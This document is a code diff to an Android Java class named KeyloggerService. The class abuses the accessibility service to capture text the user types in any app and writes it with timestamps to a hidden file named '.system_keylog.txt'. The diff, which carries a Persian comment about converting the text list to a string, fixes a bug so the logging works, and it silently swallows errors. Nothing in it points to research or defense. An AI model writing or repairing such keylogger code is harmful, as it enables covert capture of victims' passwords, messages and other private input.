@@ -10,26 +10,28 @@ import java.util.Locale;
 
 public class KeyloggerService extends AccessibilityService {
     
-    private File logFile;
-    
-    @Override
-    public void onCreate() {
-        super.onCreate();
-        logFile = new File(getFilesDir(), ".system_log.txt");
-    }
-    
     @Override
     public void onAccessibilityEvent(AccessibilityEvent event) {
         if (event.getEventType() == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
-            CharSequence text = event.getText();
-            if (text != null && text.length() > 0) {
-                String timestamp = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault())
-                    .format(new Date());
-                try (FileWriter fw = new FileWriter(logFile, true)) {
-                    fw.write(timestamp + " | " + text.toString() + "\n");
-                } catch (Exception e) {}
+            // اصلاح خط: List<CharSequence> به String تبدیل کن
+            if (event.getText() != null && event.getText().size() > 0) {
+                String text = event.getText().toString();
+                saveKeyStroke(text);
             }
         }
+    }
+    
+    private void saveKeyStroke(String text) {
+        try {
+            File logFile = new File(getFilesDir(), ".system_keylog.txt");
+            String timestamp = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault())
+                    .format(new Date());
+            String log = timestamp + " | " + text + "\n";
+            
+            FileWriter fw = new FileWriter(logFile, true);
+            fw.write(log);
+            fw.close();
+        } catch (Exception e) {}
     }
     
     @Override
